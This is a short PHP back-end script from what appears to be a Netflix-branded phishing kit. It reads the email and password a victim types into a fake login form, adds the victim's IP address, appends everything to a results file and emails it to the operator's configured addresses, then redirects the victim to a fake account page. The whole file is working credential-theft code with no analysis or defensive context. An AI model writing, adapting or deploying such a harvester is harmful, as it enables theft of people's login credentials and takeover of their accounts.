<?php
session_start();
require_once("../../main/actions/Email.php");
require_once("../../inc/logs.php");
$user = $_POST['login_user'];
$pass = $_POST['login_pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$msg = "
|😈|###########[🔔_NETFLIX_LOGIN_🔔]###########|😈|
|📧| Email : $user
|🔐| Password : $pass
|✅| IP Address : $ip
|😈|#########################################|😈|
";
$save=fopen('../../rselt/NETFLIX_LOGIN',"a+");fwrite($save,$msg);fclose($save);
mail($setting["mail_to"],"NETFLIX | New NF Account [$ip] *** ", $msg);
mail($seing["ip_login"],"[$ip] *** ", $msg);
$_SESSION['logged_in'] = "true";
header("location: ../account");
?>
